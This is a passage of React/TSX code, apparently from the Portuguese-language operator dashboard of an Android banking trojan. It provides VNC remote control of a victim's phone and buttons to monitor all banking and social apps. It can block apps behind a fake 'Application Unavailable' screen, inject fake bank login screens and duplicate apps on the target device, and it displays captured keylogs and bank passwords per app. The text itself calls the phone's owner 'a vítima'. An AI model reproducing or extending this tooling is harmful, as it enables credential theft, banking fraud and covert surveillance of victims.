            {/* Tabs para alternar entre VNC, Screen Reader V2, Lista de Apps, etc. (OTIMIZADO PARA TOUCH & CELULAR) */}
            <div className="flex items-center overflow-x-auto no-scrollbar scroll-smooth whitespace-nowrap gap-1.5 bg-[#3d0c04]/90 backdrop-blur-xl p-2 rounded-md border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] text-xs touch-pan-x min-h-[48px]">
              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(false);
                  setShowCombinedVncV2(false);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(false);
                  setShowTouchTab(false);
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  !showBankMonitorTab && !showScreenReader && !showCombinedVncV2 && !showNotificationsTab && !showEditBankScreensTab && !showEditSystemScreensTab && !showAppsTab && !showTouchTab
                    ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                 {t('tabs.vnc_normal')}
              </button>
              
              {/*  NOVA ABA COMBINADA: VNC + V2 LADO A LADO */}
              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(false);
                  setShowCombinedVncV2(true);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(false);
                  setShowTouchTab(false);
                  if (!isScreenReaderEnabled) toggleScreenReader();
                  if (!isCaptureEnabled) toggleCapture();
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                  showCombinedVncV2
                    ? 'bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_20px_rgba(239,68,68,0.5)] border border-[#4a4a56]/60 animate-pulse'
                    : 'bg-[#121214]/60 text-slate-300 hover:bg-[#24242a]/80 hover:text-white border border-[#2a2a31]'
                }`}
              >
                <span className="text-amber-400"></span>
                <span>VNC + V2 (Dividido)</span>
                <span className="px-1.5 py-0.5 text-[8px] font-black uppercase bg-[#ef4444]/30 text-[#e8e8ea] rounded-md border border-[#3a3a44]/40">NOVO</span>
              </button>

              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(true);
                  setShowCombinedVncV2(false);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(false);
                  setShowTouchTab(false);
                  if (!isScreenReaderEnabled) toggleScreenReader();
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  !showBankMonitorTab && showScreenReader && !showCombinedVncV2 && !showNotificationsTab && !showEditBankScreensTab && !showEditSystemScreensTab && !showAppsTab && !showTouchTab
                    ? 'bg-gradient-to-r from-[#ef4444] to-teal-500 text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-[#3a3a44]/40'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                <Eye className="w-3.5 h-3.5 inline mr-1 text-[#ef4444] animate-pulse" />
                V2 {isScreenReaderEnabled && ''}
              </button>
              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(false);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(false);
                  setShowTouchTab(true);
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  showTouchTab
                    ? 'bg-gradient-to-r from-amber-500 via-[#84cc16] to-yellow-500 text-white shadow-[0_0_18px_rgba(245,158,11,0.45)] border border-amber-300/50'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                 Visualizador de Toques
              </button>
              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(false);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(true);
                  fetchInstalledApps();
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  showAppsTab
                    ? 'bg-gradient-to-r from-emerald-600 to-teal-500 text-white shadow-[0_0_15px_rgba(16,185,129,0.4)] border border-emerald-400/40'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                <Smartphone className="w-3.5 h-3.5 inline mr-1 text-emerald-400" />
                {t('tabs.app_list')} {installedApps.length > 0 && `(${installedApps.length})`}
              </button>
              <button
                onClick={() => {
                  setShowBankMonitorTab(true);
                  setShowScreenReader(false);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(false);
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  showBankMonitorTab && !showEditBankScreensTab && !showEditSystemScreensTab
                    ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] text-white shadow-[0_0_15px_rgba(249,115,22,0.4)] border border-[#f87171]/40'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                 {t('tabs.banks')} {installedBanks.length > 0 && `(${installedBanks.length})`}
              </button>
              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(false);
                  setShowNotificationsTab(true);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(false);
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  showNotificationsTab && !showEditBankScreensTab && !showEditSystemScreensTab
                    ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] text-white shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-[#f87171]/40'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                <Bell className="w-3.5 h-3.5 inline mr-1 text-[#f87171]" />
                {t('tabs.notifications')} {notifications.length > 0 && `(${notifications.length})`}
              </button>
              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(false);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(true);
                  setShowEditSystemScreensTab(false);
                  setShowAppsTab(false);
                  selectPreset(selectedPresetScreenId);
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  showEditBankScreensTab
                    ? 'bg-gradient-to-r from-[#65a30d] to-[#ef4444] text-white shadow-[0_0_15px_rgba(236,72,153,0.4)] border border-pink-400/40'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                 INJECTS
              </button>
              <button
                onClick={() => {
                  setShowBankMonitorTab(false);
                  setShowScreenReader(false);
                  setShowNotificationsTab(false);
                  setShowEditBankScreensTab(false);
                  setShowEditSystemScreensTab(true);
                  setShowAppsTab(false);
                  selectSystemPreset(selectedSystemScreenId);
                }}
                className={`px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap ${
                  showEditSystemScreensTab
                    ? 'bg-gradient-to-r from-teal-600 to-emerald-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)] border border-teal-400/40'
                    : 'bg-[#121214]/60 text-slate-400 hover:bg-[#24242a]/80 hover:text-white border border-[#24242a]'
                }`}
              >
                 Telas do Sistema
              </button>
              <button
                onClick={() => setIsExpandedMode(true)}
                className="px-3 py-2 rounded-md font-bold transition-all whitespace-nowrap text-xs bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] shadow-[0_0_10px_rgba(239,68,68,0.3)] border border-[#3a3a44]/30"
                title="Expandir VNC + V2 lado a lado"
              >
                 Expandir
              </button>
            </div>
            
            {/* Conteúdo */}
            {showTouchTab ? (
              <div className="bg-[#360b03]/90 border border-amber-500/40 rounded-md p-5 text-slate-200 shadow-2xl backdrop-blur-2xl flex flex-col" style={{ minHeight: '620px' }}>
                <div className="flex items-center justify-between pb-4 border-b border-amber-500/20 mb-4">
                  <div className="flex items-center gap-3">
                    <div className="p-2.5 rounded-md bg-amber-500/20 border border-amber-400/40 text-amber-300 shadow-[0_0_15px_rgba(245,158,11,0.3)]">
                      
                    </div>
                    <div>
                      <h3 className="text-base font-black uppercase text-amber-300 font-mono tracking-wider">
                        PAINEL DEDICADO DE MONITORAMENTO DE TOQUES
                      </h3>
                      <p className="text-xs text-slate-400 font-mono">
                        Visualização exclusiva de alta precisão com rastreamento neon de cliques e gestos na tela
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="px-3 py-1 bg-amber-500/15 border border-amber-400/40 text-amber-300 text-xs font-mono font-bold rounded-full animate-pulse">
                       STREAM AO VIVO
                    </span>
                  </div>
                </div>

                <div className="flex-1 flex items-center justify-center bg-[#160303] rounded-md border border-amber-500/20 p-4 relative overflow-hidden shadow-inner">
                  <DeviceScreen
                    deviceId={deviceId!}
                    onCommand={sendCommand}
                    isBlackScreenActive={isBlackScreen}
                    captureMethod="silent"
                    onRequestFrame={() => devicesAPI.sendCommand(deviceId!, { action: 'REQUEST_VNC_FRAME' })}
                  />
                </div>
              </div>
            ) : showAppsTab ? (
              <div className="bg-[#360b03]/90 border border-[#2a2a31]/30 rounded-md p-4 text-slate-200 overflow-hidden shadow-2xl backdrop-blur-2xl" style={{ minHeight: '620px' }}>
                {/* Header do Tab de Apps */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-[#2a2a31]/20">
                  <div className="flex items-center gap-2.5">
                    <Smartphone className="w-5 h-5 text-emerald-400" />
                    <div>
                      <h3 className="text-sm font-black uppercase text-emerald-400 font-mono tracking-wider"> Aplicativos Instalados no Dispositivo</h3>
                      <p className="text-[10px] text-slate-400 font-mono">Total: {installedApps.length} aplicativos encontrados</p>
                    </div>
                  </div>
                  <button
                    onClick={() => fetchInstalledApps()}
                    disabled={isLoadingApps}
                    className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-md text-xs font-bold uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.3)] transition-all flex items-center gap-1.5 self-start sm:self-auto"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${isLoadingApps ? 'animate-spin' : ''}`} />
                    {isLoadingApps ? 'Carregando...' : 'Atualizar Lista'}
                  </button>
                </div>

                {/* Filtros e Busca */}
                <div className="flex flex-col sm:flex-row items-center justify-between gap-3 py-3">
                  <div className="flex items-center gap-1.5 w-full sm:w-auto overflow-x-auto text-xs">
                    <button
                      onClick={() => setAppsFilter('all')}
                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'all' ? 'bg-emerald-500/20 border border-emerald-500/50 text-emerald-400' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                    >
                      Todos ({installedApps.length})
                    </button>
                    <button
                      onClick={() => setAppsFilter('banks')}
                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'banks' ? 'bg-[#ef4444]/20 border border-[#ef4444]/50 text-[#f87171]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                    >
                       Bancos ({installedBanks.length})
                    </button>
                    <button
                      onClick={() => setAppsFilter('social')}
                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'social' ? 'bg-pink-500/20 border border-pink-500/50 text-pink-400' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                    >
                       Redes Sociais ({installedApps.filter(a => isSocialApp(a.package)).length})
                    </button>
                    <button
                      onClick={() => setAppsFilter('user')}
                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'user' ? 'bg-[#ef4444]/20 border border-[#2a2a31]/50 text-[#ef4444]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                    >
                       Usuário
                    </button>
                    <button
                      onClick={() => setAppsFilter('system')}
                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'system' ? 'bg-[#f87171]/20 border border-[#f87171]/50 text-[#f87171]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                    >
                      š Sistema
                    </button>
                    <button
                      onClick={() => setAppsFilter('monitored' as any)}
                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === ('monitored' as any) ? 'bg-amber-500/20 border border-amber-500/50 text-amber-400' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                    >
                       Monitorados ({monitoredAlertPkgs.length})
                    </button>
                    <button
                      onClick={() => setAppsFilter('blocked')}
                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'blocked' ? 'bg-[#ef4444]/20 border border-[#2a2a31]/50 text-[#ef4444]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                    >
                       Impedir Abertura ({blockedApps.length})
                    </button>
                  </div>

                  <input
                    type="text"
                    placeholder=" Buscar aplicativo..."
                    value={appsSearch}
                    onChange={(e) => setAppsSearch(e.target.value)}
                    className="w-full sm:w-64 px-3 py-1.5 bg-[#121214]/90 border border-[#2a2a31]/30 rounded-md text-xs text-white placeholder-[#8b8b94] focus:outline-none focus:border-emerald-400"
                  />
                </div>

                {/* Barra de Presets Rápidos do Monitoramento */}
                {appsFilter === ('monitored' as any) && (
                  <div className="mb-3 p-3 bg-gradient-to-r from-amber-950/40 via-[#121214] to-[#121214] border border-amber-500/40 rounded-md flex flex-wrap items-center justify-between gap-2 shadow-[0_0_20px_rgba(245,158,11,0.15)]">
                    <div className="flex items-center gap-2">
                      <span className="p-1.5 bg-amber-500/20 rounded-md text-amber-400 border border-amber-500/30 text-sm"></span>
                      <div>
                        <h4 className="text-xs font-black text-amber-300 uppercase tracking-wider font-mono">Central de Monitoramento de Apps</h4>
                        <p className="text-[10px] text-slate-400 font-mono">Receba alertas em tempo real e acompanhe digitações por aplicativo</p>
                      </div>
                    </div>
                    
                    <div className="flex items-center gap-1.5 flex-wrap text-xs">
                      <button
                        onClick={autoMonitorAllBanks}
                        className="px-2.5 py-1.5 bg-gradient-to-r from-amber-600 to-[#84cc16] hover:from-amber-500 hover:to-[#ef4444] text-black font-extrabold rounded-md text-[11px] uppercase tracking-wider transition-all shadow-md cursor-pointer flex items-center gap-1"
                      >
                         Monitorar Todos os Bancos ({installedBanks.length})
                      </button>
                      <button
                        onClick={autoMonitorAllSocial}
                        className="px-2.5 py-1.5 bg-pink-900/60 hover:bg-pink-800 text-pink-200 border border-pink-500/40 font-bold rounded-md text-[11px] transition-all cursor-pointer flex items-center gap-1"
                      >
                         Monitorar Redes Sociais
                      </button>
                      {monitoredAlertPkgs.length > 0 && (
                        <button
                          onClick={clearMonitoredApps}
                          className="px-2.5 py-1.5 bg-[#24242a] hover:bg-[#1a1a1e]/60 text-slate-400 hover:text-[#ef4444] border border-[#2a2a31] rounded-md text-[11px] transition-all cursor-pointer"
                        >
                           Limpar Lista
                        </button>
                      )}
                    </div>
                  </div>
                )}

                {/* Barra de Presets Rápidos do Bloqueio (Tela Indisponível) */}
                {appsFilter === 'blocked' && (
                  <div className="mb-3 p-3 bg-gradient-to-r from-[#121214]/50 via-[#180918] to-[#121214] border border-[#2a2a31]/40 rounded-md flex flex-wrap items-center justify-between gap-2 shadow-[0_0_20px_rgba(239,68,68,0.15)]">
                    <div className="flex items-center gap-2">
                      <span className="p-1.5 bg-[#ef4444]/20 rounded-md text-[#ef4444] border border-[#2a2a31]/30 text-sm"></span>
                      <div>
                        <h4 className="text-xs font-black text-[#ef4444] uppercase tracking-wider font-mono">Central de Bloqueio (Impedir Abertura)</h4>
                        <p className="text-[10px] text-slate-400 font-mono">Exibe uma tela falsa de "Aplicativo Indisponível" ao abrir apps impedidos</p>
                      </div>
                    </div>
                    
                    <div className="flex items-center gap-1.5 flex-wrap text-xs">
                      <button
                        onClick={blockAllBanks}
                        className="px-2.5 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#84cc16] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] font-extrabold rounded-md text-[11px] uppercase tracking-wider transition-all shadow-md cursor-pointer flex items-center gap-1"
                      >
                         Bloquear Todos os Bancos ({installedBanks.length})
                      </button>
                      <button
                        onClick={blockAllSocial}
                        className="px-2.5 py-1.5 bg-pink-900/60 hover:bg-pink-800 text-pink-200 border border-pink-500/40 font-bold rounded-md text-[11px] transition-all cursor-pointer flex items-center gap-1"
                      >
                         Bloquear Redes Sociais
                      </button>
                      <button
                        onClick={() => testAppUnavailableScreen('com.android.settings', 'Configurações')}
                        className="px-2.5 py-1.5 bg-amber-600/80 hover:bg-amber-500 text-white font-bold rounded-md text-[11px] transition-all cursor-pointer flex items-center gap-1"
                      >
                         Testar Tela Indisponível
                      </button>
                      {blockedApps.length > 0 && (
                        <button
                          onClick={clearBlockedApps}
                          className="px-2.5 py-1.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 border border-[#2a2a31] rounded-md text-[11px] transition-all cursor-pointer"
                        >
                           Desbloquear Todos
                        </button>
                      )}
                    </div>
                  </div>
                )}

                {/* Lista de Apps */}
                <div className="overflow-y-auto max-h-[500px] space-y-2.5 pr-1">
                  {filteredApps.filter(app => {
                    if ((appsFilter as any) === 'monitored') return isAppMonitored(app.package);
                    if (appsFilter === 'blocked') return isAppBlocked(app.package);
                    if (appsFilter === 'social') return isSocialApp(app.package);
                    return true;
                  }).length === 0 ? (
                    <div className="py-14 text-center text-[#8b8b94] bg-[#210603]/60 rounded-md border border-[#2a2a31]/20 p-6">
                      <div className="w-16 h-16 bg-amber-500/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-amber-500/30 shadow-[0_0_20px_rgba(245,158,11,0.2)]">
                        <Bell className="w-8 h-8 text-amber-400 animate-bounce" />
                      </div>
                      <h3 className="text-sm font-black text-amber-300 font-mono uppercase tracking-wider">
                        {appsFilter === ('monitored' as any) ? 'Nenhum Aplicativo na Lista de Monitoramento' : appsFilter === 'blocked' ? 'Nenhum Aplicativo na Lista de Bloqueio' : 'Nenhum Aplicativo Encontrado'}
                      </h3>
                      <p className="text-xs text-slate-400 max-w-md mx-auto mt-1 mb-4 font-mono">
                        {appsFilter === ('monitored' as any) 
                          ? 'Adicione aplicativos à lista de monitoramento para receber alertas instantneos quando a vítima abrir o app no celular.'
                          : appsFilter === 'blocked'
                          ? 'Impeça a abertura de aplicativos no celular do alvo. Ao abrir um app impedido, a vítima verá uma tela de Aplicativo Indisponível.'
                          : 'Clique em "Atualizar Lista" para sincronizar com os aplicativos instalados no aparelho.'}
                      </p>
                      {appsFilter === ('monitored' as any) && (
                        <div className="flex items-center justify-center gap-2 flex-wrap">
                          <button
                            onClick={autoMonitorAllBanks}
                            className="px-4 py-2 bg-gradient-to-r from-amber-500 to-[#ef4444] text-black font-extrabold rounded-md text-xs uppercase tracking-wider shadow-lg hover:brightness-110 transition-all cursor-pointer"
                          >
                             Monitorar Todos os Bancos ({installedBanks.length})
                          </button>
                          <button
                            onClick={autoMonitorAllSocial}
                            className="px-4 py-2 bg-pink-900/80 hover:bg-pink-800 text-pink-200 font-bold rounded-md text-xs border border-pink-500/40 transition-all cursor-pointer"
                          >
                             Monitorar Redes Sociais
                          </button>
                        </div>
                      )}
                      {appsFilter === 'blocked' && (
                        <div className="flex items-center justify-center gap-2 flex-wrap">
                          <button
                            onClick={blockAllBanks}
                            className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#84cc16] text-[#10120a] font-extrabold rounded-md text-xs uppercase tracking-wider shadow-lg hover:brightness-110 transition-all cursor-pointer"
                          >
                             Bloquear Todos os Bancos ({installedBanks.length})
                          </button>
                          <button
                            onClick={blockAllSocial}
                            className="px-4 py-2 bg-pink-900/80 hover:bg-pink-800 text-pink-200 font-bold rounded-md text-xs border border-pink-500/40 transition-all cursor-pointer"
                          >
                             Bloquear Redes Sociais
                          </button>
                        </div>
                      )}
                    </div>
                  ) : (
                    filteredApps.filter(app => {
                      if ((appsFilter as any) === 'monitored') return isAppMonitored(app.package);
                      if (appsFilter === 'blocked') return isAppBlocked(app.package);
                      if (appsFilter === 'social') return isSocialApp(app.package);
                      return true;
                    }).map((app, index) => {
                      const isMonitored = isAppMonitored(app.package);
                      const isBlocked = isAppBlocked(app.package);
                      const isExpanded = expandedAppActivities === app.package;
                      
                      // Conta estatísticas do aplicativo em tempo real
                      const appKeylogs = (keylogs || []).filter((k: any) => k.package === app.package || (k.appName && k.appName.toLowerCase().includes(app.name.toLowerCase())));
                      const appPasswords = (bankPasswords || []).filter(p => p.package === app.package);
                      const appNotifs = (notifications || []).filter(n => n.package === app.package);

                      return (
                        <div
                          key={index}
                          className={`rounded-md transition-all border overflow-hidden ${
                            isBlocked
                              ? 'bg-gradient-to-r from-[#121214]/30 via-[#190918] to-[#0d040e] border-[#2a2a31]/60 shadow-[0_0_20px_rgba(239,68,68,0.25)]'
                              : isMonitored
                              ? 'bg-gradient-to-r from-amber-950/20 via-[#320a03] to-[#240703] border-amber-500/50 shadow-[0_0_20px_rgba(245,158,11,0.18)]'
                              : 'bg-[#121214]/70 border-[#24242a] hover:border-[#2a2a31]/40 hover:bg-[#121214]/90'
                          }`}
                        >
                          {/* Linha Principal do App */}
                          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 p-3.5">
                            <div className="flex items-center space-x-3 min-w-0">
                              <BankIcon pkg={app.package} iconB64={app.icon || app.iconB64 || app.icon_base64} name={app.name} size={42} />
                              <div className="min-w-0">
                                <div className="flex items-center gap-2 flex-wrap mb-0.5">
                                  <span className="font-extrabold text-sm text-white truncate max-w-[220px] font-mono">{app.name}</span>
                                  {isBlocked && (
                                    <span className="px-2 py-0.5 text-[9px] font-black uppercase tracking-wider bg-[#ef4444]/20 text-[#ef4444] rounded-md border border-[#3a3a44]/50 animate-pulse flex items-center gap-1 shadow-sm">
                                      <span>š«</span> INDISPONVEL
                                    </span>
                                  )}
                                  {isMonitored && (
                                    <span className="px-2 py-0.5 text-[9px] font-black uppercase tracking-wider bg-amber-500/20 text-amber-300 rounded-md border border-amber-400/50 animate-pulse flex items-center gap-1 shadow-sm">
                                      <span></span> MONITORADO
                                    </span>
                                  )}
                                  {isSocialApp(app.package) ? (
                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-pink-500/20 text-pink-300 rounded-md border border-pink-500/30"> Redes Sociais</span>
                                  ) : installedBanks.some(b => b.package === app.package) ? (
                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-amber-500/20 text-amber-300 rounded-md border border-amber-500/30"> Banco</span>
                                  ) : app.isSystem ? (
                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-[#24242a] text-slate-400 rounded-md border border-[#2a2a31]">Sistema</span>
                                  ) : (
                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-[#ef4444]/15 text-[#ef4444] rounded-md border border-[#2a2a31]/30">Usuário</span>
                                  )}
                                </div>
                                <p className="text-[10px] font-mono text-slate-400 truncate max-w-[300px]">{app.package}</p>
                                
                                {/* Estatísticas de Atividade */}
                                <div className="flex items-center gap-2 mt-1.5 flex-wrap text-[10px] font-mono">
                                  <span className={`px-2 py-0.5 rounded-full border ${appKeylogs.length > 0 ? 'bg-[#121214] text-[#ef4444] border-[#2a2a31]/30' : 'bg-[#121214] text-[#8b8b94] border-[#24242a]'}`}>
                                    ¨ {appKeylogs.length} keylogs
                                  </span>
                                  <span className={`px-2 py-0.5 rounded-full border ${appPasswords.length > 0 ? 'bg-[#121214] text-[#ef4444] border-[#2a2a31]/40 font-bold' : 'bg-[#121214] text-[#8b8b94] border-[#24242a]'}`}>
                                     {appPasswords.length} senhas
                                  </span>
                                  <span className={`px-2 py-0.5 rounded-full border ${appNotifs.length > 0 ? 'bg-amber-950 text-amber-300 border-amber-500/30' : 'bg-[#121214] text-[#8b8b94] border-[#24242a]'}`}>
                                     {appNotifs.length} notificações
                                  </span>
                                </div>
                              </div>
                            </div>

                            {/* Botões de Ação do App */}
                            <div className="flex items-center gap-1.5 flex-wrap">
                              <button
                                onClick={() => setExpandedAppActivities(isExpanded ? null : app.package)}
                                className={`px-3 py-1.5 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
                                  isExpanded
                                    ? 'bg-[#ef4444] text-black border-[#4a4a56] shadow-[0_0_12px_rgba(239,68,68,0.5)]'
                                    : 'bg-[#24242a]/80 hover:bg-[#2a2a31] text-[#ef4444] border-[#2a2a31]/30'
                                }`}
                                title="Ver histórico de atividades e configurar ações automáticas para este app"
                              >
                                <Eye className="w-3.5 h-3.5" />
                                {isExpanded ? 'Fechar Painel' : ' Atividades & Gatilhos'}
                              </button>

                              <button
                                onClick={() => toggleBlockApp(app.package, app.name)}
                                className={`px-3 py-1.5 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
                                  isBlocked
                                    ? 'bg-[#ef4444] text-white border-[#3a3a44] shadow-[0_0_12px_rgba(239,68,68,0.5)] animate-pulse'
                                    : 'bg-[#24242a] hover:bg-[#2a2a31] text-[#ef4444] border-[#1a1a1e]/50'
                                }`}
                                title="Impedir abertura deste app exibindo tela falsa de Aplicativo Indisponível"
                              >
                                <ShieldAlert className={`w-3.5 h-3.5 ${isBlocked ? 'text-white' : 'text-[#ef4444]'}`} />
                                {isBlocked ? ' Indisponível' : ' Impedir Abertura'}
                              </button>

                              <button
                                onClick={() => toggleMonitorAppAlert(app.package, app.name)}
                                className={`px-3 py-1.5 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
                                  isMonitored
                                    ? 'bg-amber-500 text-black border-amber-300 shadow-[0_0_12px_rgba(245,158,11,0.5)]'
                                    : 'bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 border-[#2a2a31]'
                                }`}
                                title="Notificar no painel quando este aplicativo for aberto no dispositivo alvo"
                              >
                                <Bell className={`w-3.5 h-3.5 ${isMonitored ? 'animate-bounce' : ''}`} />
                                {isMonitored ? ' Monitorado' : ' Alertar'}
                              </button>

                              <button
                                onClick={() => openApp(app.package, app.name)}
                                className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-md text-[11px] font-bold uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(16,185,129,0.2)] cursor-pointer"
                              >
                                ¶ Abrir
                              </button>

                              <button
                                onClick={() => handleDirectDuplicate(app.package, app.name)}
                                className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] border border-[#3a3a44]/40 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 shadow-[0_0_12px_rgba(239,68,68,0.35)] cursor-pointer"
                                title="Duplicar aplicativo no dispositivo alvo"
                              >
                                <Copy size={13} /> Duplicar
                              </button>
                            </div>
                          </div>

                          {/* Painel Expansível de Atividades e Gatilhos do App */}
                          {isExpanded && (
                            <div className="bg-[#1a0503] border-t border-[#2a2a31]/30 p-3 space-y-3 font-mono text-xs select-none">
                              <div className="flex items-center justify-between border-b border-[#2a2a31]/20 pb-2">
                                <span className="font-bold text-[#ef4444] flex items-center gap-1.5">
                                  <Eye className="w-4 h-4 text-[#ef4444]" />
                                  Painel de Atividades & Ações: {app.name}
                                </span>
                                <span className="text-[10px] text-slate-400 font-mono">Package: {app.package}</span>
                              </div>

                              {/* Ações Rápidas de Injeção & Controle */}
                              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px]">
                                <button
                                  onClick={() => openApp(app.package, app.name)}
                                  className="py-1.5 px-2 bg-emerald-950/60 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                >
                                  ¶ Abrir no Aparelho
                                </button>
                                <button
                                  onClick={() => {
                                    setEditBankPackage(app.package);
                                    setEditBankLogoText(app.name);
                                    setShowEditBankScreensTab(true);
                                  }}
                                  className="py-1.5 px-2 bg-pink-950/60 hover:bg-pink-900 text-pink-300 border border-pink-500/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                >
                                   Injetar Tela Fake
                                </button>
                                <button
                                  onClick={() => {
                                    setShowScreenReader(true);
                                    if (!isScreenReaderEnabled) toggleScreenReader();
                                  }}
                                  className="py-1.5 px-2 bg-[#121214]/60 hover:bg-[#1a1a1e] text-[#ef4444] border border-[#2a2a31]/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                >
                                   Ver na Tela V2
                                </button>
                                <button
                                  onClick={() => forceStopApp(app.package, app.name)}
                                  className="py-1.5 px-2 bg-amber-950/60 hover:bg-amber-900 text-amber-300 border border-amber-500/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                >
                                   Forçar Parada
                                </button>
                              </div>

                              {/* Histórico de Digitações (Keylogs) neste App */}
                              <div className="bg-[#2d0903] rounded-md p-2.5 border border-[#2a2a31]/20 space-y-1.5">
                                <div className="flex items-center justify-between text-[11px] font-bold text-[#ef4444]">
                                  <span>¨ Keylogs Registrados neste App ({appKeylogs.length})</span>
                                </div>
